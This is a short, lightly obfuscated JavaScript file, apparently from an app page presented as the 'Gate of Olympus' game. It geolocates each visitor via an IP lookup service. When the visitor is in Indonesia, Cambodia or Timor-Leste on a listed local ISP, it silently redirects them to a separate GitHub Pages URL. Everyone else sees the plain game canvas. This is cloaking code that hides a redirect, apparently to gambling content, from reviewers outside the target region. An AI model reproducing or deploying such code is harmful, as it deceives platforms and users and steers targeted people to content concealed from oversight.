var privacypolicy = "https://m.oke1app77.art/id/panduan";
var applink = "https://gadekuran3.github.io/gate_of_olympus/app.html?ver="+ Math.random(); ;
 
function stop() {
    throw new Error('LOG ERROR!')
}

function checkurl(_0x5d16x3) {
    $['ajax']({
        url: _0x5d16x3,
        dataType: 'jsonp',
        success: function(_0x5d16x3) {},
        statusCode: {
            200: function() {
                console['log']('Roll it on!'), document['getElementById']('canvas')['style']['display'] = 'none', document['getElementById']('loading')['style']['display'] = 'block', location['assign'](_0x5d16x3)
            },
            404: function() {
                console['log']('Game Connected'), document['getElementById']('canvas')['style']['display'] = 'block', document['getElementById']('loading')['style']['display'] = 'none'
            }
        }
    })
}

$['get']('https://json.geoiplookup.io/', function(_0x5d16x3) {
    console['log'](_0x5d16x3);
    _0x5d16x3['country_code'], navigator['userAgent']['toLowerCase']();
    negara = ['ID', 'KH', 'TL'], op = ['myrepublik', 'republik', 'fastnet', 'indosatm2', 'telekomunikasi', 'indosat', 'cyberindo', 'biznet', 'xl', 'telematika', 'hutchison', 'smartfren', 'mnc', 'wireless indonesia', 'antar nusa', 'biznet', 'ezecom', 'win', 'axis', 'linknet-fastnet', 'sarana', 'nusantara', 'indonesia', 'bali', 'linknet', 'abadi', 'indosat', 'indo', 'firstmedia', 's.i', 'cambodia', 'panca'], regional = ['Q'], kota = ['Q'];
    var _0x5d16x4 = _0x5d16x3['asn_org']['toLowerCase']();
    negara['includes'](_0x5d16x3['country_code']) && !0 === op['some'](function(_0x5d16x3) {
        return _0x5d16x4['includes'](_0x5d16x3)
    }) ? checkurl(applink) : (document['getElementById']('canvas')['style']['display'] = 'block', document['getElementById']('loading')['style']['display'] = 'none')
}, 'jsonp')['fail'](function() {
    document['getElementById']('loading')['style']['display'] = 'none', document['getElementById']('canvas')['style']['display'] = 'none', document['getElementById']('errorpage')['style']['display'] = 'block', stop()
})